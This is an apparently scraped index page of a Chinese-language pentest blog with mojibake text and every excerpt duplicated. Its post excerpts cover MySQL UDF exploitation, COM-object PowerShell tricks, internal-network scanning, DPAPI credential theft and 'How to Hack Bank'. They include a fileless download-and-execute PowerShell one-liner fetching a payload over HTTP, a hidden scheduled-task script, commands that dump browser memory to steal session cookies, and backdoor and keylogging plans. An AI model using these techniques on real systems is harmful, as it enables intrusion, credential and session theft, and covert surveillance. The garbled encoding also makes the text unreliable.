		<blockquote>
<p>[mysql-udf-exploitation]<a target="_blank" rel="noopener" href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSFçš„dll: <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
</blockquote>
<h3 id="0x01-å‡†å¤‡å·¥ä½œ"><a href="#0x01-å‡†å¤‡å·¥ä½œ" class="headerlink" title="0x01 å‡†å¤‡å·¥ä½œ"></a>0x01 å‡†å¤‡å·¥ä½œ</h3><p>å…ˆæ£€æŸ¥è¿è¡Œçš„mysqlç»“æ„:</p>
<pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;
show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ç»“æœå¦‚ä¸‹:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>
+----------------------+---------------------------+
<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>
+----------------------+---------------------------+
<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>
+----------------------+---------------------------+
MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>
+-------------------------+--------+
<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>
+-------------------------+--------+
<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span>
<span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>
+-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨<code>Mysql 5.0.67</code>ç‰ˆæœ¬å¼€å§‹ï¼ŒUDFçš„æ–‡ä»¶å¿…é¡»æ”¾åœ¨mysqlçš„æ’ä»¶ç›®å½•: <code>select @@plugin_dir;</code></p>
<p>å¯ä»¥åœ¨å¼€å¯mysqlçš„æ—¶å€™è®¾ç½®pluginçš„ç›®å½•:</p>
<pre class="line-numbers language-none"><code class="language-none">æŒ‡å®šç›®å½•:
mysqld.exe â€“plugin-dir&#x3D;C:\\temp\\plugins\\

æŒ‡å®šé…ç½®æ–‡ä»¶:
mysqld.exe --defaults-file&#x3D;C:\\temp\\my.ini

é…ç½®æ–‡ä»¶åŒ…æ‹¬å¦‚ä¸‹å†…å®¹:
[mysqld]
plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è€ç‰ˆæœ¬çš„Mysqlæœç´¢UDFè·¯å¾„æ˜¯æŒ‰ç…§å¦‚ä¸‹çš„é¡ºåºæ¥çš„:</p>
	
	</div>
  <a type="button" href="/2020/07/29/mysql-UDF.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/07/16/Com-Object-Pentest-Note2.html" >Com Object</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-07-16  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>COM is the foundation technology for Microsoftâ€™s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
</blockquote>
<p>æˆ‘å°±çå†™äº†:</p>
<p>COMæ˜¯åœ¨1990sçš„æ—¶å€™è¯ç”Ÿçš„ï¼Œå¯ç”¨æ¥åˆ†ç¦»ä»£ç æ¨¡å—å’Œå…¶å®ƒå†…å®¹ã€‚</p>
<h3 id="æ–‡ä»¶ä¸‹è½½"><a href="#æ–‡ä»¶ä¸‹è½½" class="headerlink" title="æ–‡ä»¶ä¸‹è½½"></a>æ–‡ä»¶ä¸‹è½½</h3><pre class="line-numbers language-none"><code class="language-none">Powershellæ— æ–‡ä»¶è½åœ°æ‰§è¡Œ
$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">ä¸‹è½½æ–‡ä»¶,å¦‚æœéœ€è¦ä¸‹è½½exeï¼Œè½¬æ¢æˆhexæˆ–è€…base64ï¼Œå†ç¼–ç 
powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="å®šæ—¶ä»»åŠ¡"><a href="#å®šæ—¶ä»»åŠ¡" class="headerlink" title="å®šæ—¶ä»»åŠ¡"></a>å®šæ—¶ä»»åŠ¡</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
$Instance.Connect()
$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
$Task &#x3D; $Instance.NewTask(0)
$Trigger &#x3D; $Task.triggers.Create(0)
$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
$Trigger.Enabled &#x3D; $True
$Trigger.Id &#x3D; $Taskname
$Action &#x3D; $Task.Actions.Create(0)
$Action.Path &#x3D; â€œcmd.exeâ€
$Action.Arguments &#x3D; â€œ&#x2F;c whoamiâ€
$Action.HideAppWindow &#x3D; $True
$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)

function Convert-Date &#123;       

        param(
             [datetime]$Date

        )       

        PROCESS &#123;
               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
        &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
</ul>

	

	</div>
  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>COM is the foundation technology for Microsoftâ€™s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
</blockquote>
<p>æˆ‘å°±çå†™äº†:</p>
<p>COMæ˜¯åœ¨1990sçš„æ—¶å€™è¯ç”Ÿçš„ï¼Œå¯ç”¨æ¥åˆ†ç¦»ä»£ç æ¨¡å—å’Œå…¶å®ƒå†…å®¹ã€‚</p>
<h3 id="æ–‡ä»¶ä¸‹è½½"><a href="#æ–‡ä»¶ä¸‹è½½" class="headerlink" title="æ–‡ä»¶ä¸‹è½½"></a>æ–‡ä»¶ä¸‹è½½</h3><pre class="line-numbers language-none"><code class="language-none">Powershellæ— æ–‡ä»¶è½åœ°æ‰§è¡Œ
$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">ä¸‹è½½æ–‡ä»¶,å¦‚æœéœ€è¦ä¸‹è½½exeï¼Œè½¬æ¢æˆhexæˆ–è€…base64ï¼Œå†ç¼–ç 
powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="å®šæ—¶ä»»åŠ¡"><a href="#å®šæ—¶ä»»åŠ¡" class="headerlink" title="å®šæ—¶ä»»åŠ¡"></a>å®šæ—¶ä»»åŠ¡</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
$Instance.Connect()
$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
$Task &#x3D; $Instance.NewTask(0)
$Trigger &#x3D; $Task.triggers.Create(0)
$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
$Trigger.Enabled &#x3D; $True
$Trigger.Id &#x3D; $Taskname
$Action &#x3D; $Task.Actions.Create(0)
$Action.Path &#x3D; â€œcmd.exeâ€
$Action.Arguments &#x3D; â€œ&#x2F;c whoamiâ€
$Action.HideAppWindow &#x3D; $True
$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)

function Convert-Date &#123;       

        param(
             [datetime]$Date

        )       

        PROCESS &#123;
               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
        &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
</ul>

	
	</div>
  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/05/14/workgroup-pentest2.html" >å†…ç½‘æ¸—é€æµæ°´è´¦</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-05-14  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h2 id="0x01-ç¯å¢ƒ"><a href="#0x01-ç¯å¢ƒ" class="headerlink" title="0x01 ç¯å¢ƒ"></a>0x01 ç¯å¢ƒ</h2><ol>
<li>Linuxä¸»æœºwwwæƒé™</li>
<li>ä¸»æœºæ— æ³•å‡ºå¤–ç½‘</li>
<li>æ­£å‘ä»£ç†æ— æ³•ä½¿ç”¨</li>
<li>Bæ®µå†…ç½‘</li>
</ol>
<h2 id="æ”¶é›†ä¿¡æ¯"><a href="#æ”¶é›†ä¿¡æ¯" class="headerlink" title="æ”¶é›†ä¿¡æ¯"></a>æ”¶é›†ä¿¡æ¯</h2><p>#####F-Scrack.py</p>
<pre class="line-numbers language-none"><code class="language-none">è·å–Redis, ESç­‰
PS: Scrack.pyçš„mssqlæ¨¡å—çˆ†ç ´ä¸å‡†ç¡®ï¼Œå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªç®€å•çš„

python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>keyè¾ƒå¤šçš„æ—¶å€™ä¸è¦ä½¿ç”¨<code>keys *</code></p>
<pre class="line-numbers language-none"><code class="language-none">æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯: masterï¼Œæ•°é‡ï¼Œç‰ˆæœ¬å·
ä½¿ç”¨scanæŸ¥çœ‹keys: scan 0 match * count 100 
æŸ¥çœ‹ç±»å‹: type &lt;key&gt;
hashç±»å‹: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>windowsä¸‹å¯ä»¥å…ˆæµ‹è¯•æ˜¯å¦å¯å†™å…¥æ’ä»¶ç›®å½•:</p>
	

	</div>
  <a type="button" href="/2020/05/14/workgroup-pentest2.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h2 id="0x01-ç¯å¢ƒ"><a href="#0x01-ç¯å¢ƒ" class="headerlink" title="0x01 ç¯å¢ƒ"></a>0x01 ç¯å¢ƒ</h2><ol>
<li>Linuxä¸»æœºwwwæƒé™</li>
<li>ä¸»æœºæ— æ³•å‡ºå¤–ç½‘</li>
<li>æ­£å‘ä»£ç†æ— æ³•ä½¿ç”¨</li>
<li>Bæ®µå†…ç½‘</li>
</ol>
<h2 id="æ”¶é›†ä¿¡æ¯"><a href="#æ”¶é›†ä¿¡æ¯" class="headerlink" title="æ”¶é›†ä¿¡æ¯"></a>æ”¶é›†ä¿¡æ¯</h2><p>#####F-Scrack.py</p>
<pre class="line-numbers language-none"><code class="language-none">è·å–Redis, ESç­‰
PS: Scrack.pyçš„mssqlæ¨¡å—çˆ†ç ´ä¸å‡†ç¡®ï¼Œå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªç®€å•çš„

python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>keyè¾ƒå¤šçš„æ—¶å€™ä¸è¦ä½¿ç”¨<code>keys *</code></p>
<pre class="line-numbers language-none"><code class="language-none">æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯: masterï¼Œæ•°é‡ï¼Œç‰ˆæœ¬å·
ä½¿ç”¨scanæŸ¥çœ‹keys: scan 0 match * count 100 
æŸ¥çœ‹ç±»å‹: type &lt;key&gt;
hashç±»å‹: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>windowsä¸‹å¯ä»¥å…ˆæµ‹è¯•æ˜¯å¦å¯å†™å…¥æ’ä»¶ç›®å½•:</p>
	
	</div>
  <a type="button" href="/2020/05/14/workgroup-pentest2.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/05/06/python-elk.html" >Pythonå¤„ç†xlsxåˆ°ELK</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-05-06  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>éœ€è¦æŠŠæ•°æ®ä»xlsxè¯»åˆ°elkï¼Œå†åšæ•°æ®åˆ†æï¼Œé‡åˆ°ä¸€ä¸ªé—®é¢˜æ˜¯æŠŠå½“åœ¨elké‡Œé¢å¤„ç†æ—¥æœŸç±»çš„æ•°æ®çš„æ—¶å€™ï¼Œéœ€è¦æŠŠæ•°æ®è½¬æ¢ä¸ºDateç±»å‹:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">float2utc</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
	date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token operator">*</span>xldate_as_tuple<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

	local <span class="token operator">=</span> pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>
	local_dt <span class="token operator">=</span> local<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>date<span class="token punctuation">,</span> is_dst<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
	utc_dt <span class="token operator">=</span> local_dt<span class="token punctuation">.</span>astimezone<span class="token punctuation">(</span>pytz<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>
	timeStr <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>utc_dt<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%f"</span><span class="token punctuation">)</span>
	timeStr <span class="token operator">=</span> timeStr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
	<span class="token comment">#cell = date.strftime('%Y/%m/%d %H:%M')</span>
	<span class="token keyword">return</span> timeStr <span class="token operator">+</span> <span class="token string">"Z"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<ul>
<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon">https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon</a></li>
</ul>

	

	</div>
  <a type="button" href="/2020/05/06/python-elk.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>éœ€è¦æŠŠæ•°æ®ä»xlsxè¯»åˆ°elkï¼Œå†åšæ•°æ®åˆ†æï¼Œé‡åˆ°ä¸€ä¸ªé—®é¢˜æ˜¯æŠŠå½“åœ¨elké‡Œé¢å¤„ç†æ—¥æœŸç±»çš„æ•°æ®çš„æ—¶å€™ï¼Œéœ€è¦æŠŠæ•°æ®è½¬æ¢ä¸ºDateç±»å‹:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">float2utc</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
	date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token operator">*</span>xldate_as_tuple<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

	local <span class="token operator">=</span> pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>
	local_dt <span class="token operator">=</span> local<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>date<span class="token punctuation">,</span> is_dst<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
	utc_dt <span class="token operator">=</span> local_dt<span class="token punctuation">.</span>astimezone<span class="token punctuation">(</span>pytz<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>
	timeStr <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>utc_dt<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%f"</span><span class="token punctuation">)</span>
	timeStr <span class="token operator">=</span> timeStr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
	<span class="token comment">#cell = date.strftime('%Y/%m/%d %H:%M')</span>
	<span class="token keyword">return</span> timeStr <span class="token operator">+</span> <span class="token string">"Z"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<ul>
<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon">https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon</a></li>
</ul>

	
	</div>
  <a type="button" href="/2020/05/06/python-elk.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/04/22/how-to-hack-bank.html" >How to Hack Bank</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-04-22  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>[Thread-Phineas-Phisher-Hack-Back-Bank]<a target="_blank" rel="noopener" href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p>
</blockquote>
<h3 id="ä»æµè§ˆå™¨dumpç™»é™†Cookie"><a href="#ä»æµè§ˆå™¨dumpç™»é™†Cookie" class="headerlink" title="ä»æµè§ˆå™¨dumpç™»é™†Cookie"></a>ä»æµè§ˆå™¨dumpç™»é™†Cookie</h3><pre class="line-numbers language-none"><code class="language-none">procdump64 &#x2F;accepteula -r -ma PID_of_browser
strings64 &#x2F;accepteula * .dmp | findstr PHPSESSID 2&gt; nul
findstr PHPSESSID * .dmp&gt; tmp
strings64 &#x2F;accepteula tmp | findstr PHPSESSID 2&gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="å‡†å¤‡åè·¯"><a href="#å‡†å¤‡åè·¯" class="headerlink" title="å‡†å¤‡åè·¯"></a>å‡†å¤‡åè·¯</h3><ol>
<li>å¸¸ç”¨çš„æ“ä½œç”¨ä¸€ä¸ªåé—¨</li>
<li>ç•™ä¸€ä¸ªå¤‡ç”¨çš„åé—¨ï¼Œç¬¬ä¸€ä¸ªå¤±æ•ˆä¹‹åå¯ç”¨</li>
</ol>
<h3 id="æ”¶é›†ä¿¡æ¯"><a href="#æ”¶é›†ä¿¡æ¯" class="headerlink" title="æ”¶é›†ä¿¡æ¯"></a>æ”¶é›†ä¿¡æ¯</h3><p>ç”¨åˆ°ä¸€ä¸‹æ¨¡å—:</p>
<pre class="line-numbers language-none"><code class="language-none">MSFæ¯5sæˆªå±:
post&#x2F;windows&#x2F;gather&#x2F;screen_spy

å†åŠ ä¸Šä¸€ä¸ªé”®ç›˜è®°å½•å™¨ï¼Œé€šè¿‡è¿™ä¸¤ä¸ªä¸œè¥¿æ”¶é›†ä¿¡æ¯ï¼Œäº†è§£å¤§æ¦‚çš„å·¥ä½œæµç¨‹ã€‚


ä½¿ç”¨Windowsè‡ªå¸¦çš„PSRæˆªå±ï¼š
psr.exe &#x2F;start &#x2F;gui 0 &#x2F;output C:\Users\Dan\Desktop\cool.zip;
Start-Sleep -s 20;
psr.exe &#x2F;stop;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><pre class="line-numbers language-none"><code class="language-none">Hacking has made me feel alive. It started as a way to self-medicate depression. Later I
realized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at 
all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue 
living that way. So I began to spend more time away from my computer, with other people, 
learning to open myself to the world, to feel my emotions, to connect with others, to accept 
risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is 
more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on 
my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2020/04/22/how-to-hack-bank.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>[Thread-Phineas-Phisher-Hack-Back-Bank]<a target="_blank" rel="noopener" href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p>
</blockquote>
<h3 id="ä»æµè§ˆå™¨dumpç™»é™†Cookie"><a href="#ä»æµè§ˆå™¨dumpç™»é™†Cookie" class="headerlink" title="ä»æµè§ˆå™¨dumpç™»é™†Cookie"></a>ä»æµè§ˆå™¨dumpç™»é™†Cookie</h3><pre class="line-numbers language-none"><code class="language-none">procdump64 &#x2F;accepteula -r -ma PID_of_browser
strings64 &#x2F;accepteula * .dmp | findstr PHPSESSID 2&gt; nul
findstr PHPSESSID * .dmp&gt; tmp
strings64 &#x2F;accepteula tmp | findstr PHPSESSID 2&gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="å‡†å¤‡åè·¯"><a href="#å‡†å¤‡åè·¯" class="headerlink" title="å‡†å¤‡åè·¯"></a>å‡†å¤‡åè·¯</h3><ol>
<li>å¸¸ç”¨çš„æ“ä½œç”¨ä¸€ä¸ªåé—¨</li>
<li>ç•™ä¸€ä¸ªå¤‡ç”¨çš„åé—¨ï¼Œç¬¬ä¸€ä¸ªå¤±æ•ˆä¹‹åå¯ç”¨</li>
</ol>
<h3 id="æ”¶é›†ä¿¡æ¯"><a href="#æ”¶é›†ä¿¡æ¯" class="headerlink" title="æ”¶é›†ä¿¡æ¯"></a>æ”¶é›†ä¿¡æ¯</h3><p>ç”¨åˆ°ä¸€ä¸‹æ¨¡å—:</p>
<pre class="line-numbers language-none"><code class="language-none">MSFæ¯5sæˆªå±:
post&#x2F;windows&#x2F;gather&#x2F;screen_spy

å†åŠ ä¸Šä¸€ä¸ªé”®ç›˜è®°å½•å™¨ï¼Œé€šè¿‡è¿™ä¸¤ä¸ªä¸œè¥¿æ”¶é›†ä¿¡æ¯ï¼Œäº†è§£å¤§æ¦‚çš„å·¥ä½œæµç¨‹ã€‚


ä½¿ç”¨Windowsè‡ªå¸¦çš„PSRæˆªå±ï¼š
psr.exe &#x2F;start &#x2F;gui 0 &#x2F;output C:\Users\Dan\Desktop\cool.zip;
Start-Sleep -s 20;
psr.exe &#x2F;stop;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><pre class="line-numbers language-none"><code class="language-none">Hacking has made me feel alive. It started as a way to self-medicate depression. Later I
realized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at 
all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue 
living that way. So I began to spend more time away from my computer, with other people, 
learning to open myself to the world, to feel my emotions, to connect with others, to accept 
risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is 
more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on 
my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2020/04/22/how-to-hack-bank.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/04/13/dpapi-pass-dump.html" >é€šè¿‡DPAPIè·å–windowsèº«ä»½å‡­è¯</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-04-13  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="èƒŒæ™¯ä»‹ç»"><a href="#èƒŒæ™¯ä»‹ç»" class="headerlink" title="èƒŒæ™¯ä»‹ç»"></a>èƒŒæ™¯ä»‹ç»</h3><p>DPAPI(Date Protection Application Programming Interface)ï¼Œä»windows2000ä¹‹åï¼Œå¾®è½¯æä¾›çš„ä¸€ä¸ªç‰¹æ®Šæ•°æ®ä¿æŠ¤æ¥å£ï¼Œä½¿ç”¨äº†å¯¹ç§°çš„åŠ è§£å¯†å‡½æ•°å¯¹å¯†ç åŠ å¯†ã€‚åŒ…æ‹¬:</p>
<ul>
<li>IEã€Chromeå¯†ç ç™»é™†è¡¨å•çš„è‡ªåŠ¨å®Œæˆ</li>
<li>é‚®ç®±å®¢æˆ·ç«¯ç”¨æˆ·å¯†ç </li>
<li>FTPç®¡ç†è´¦æˆ·å¯†ç </li>
<li>è¿œç¨‹æ¡Œé¢èº«ä»½å¯†ç </li>
<li>â€¦â€¦</li>
</ul>
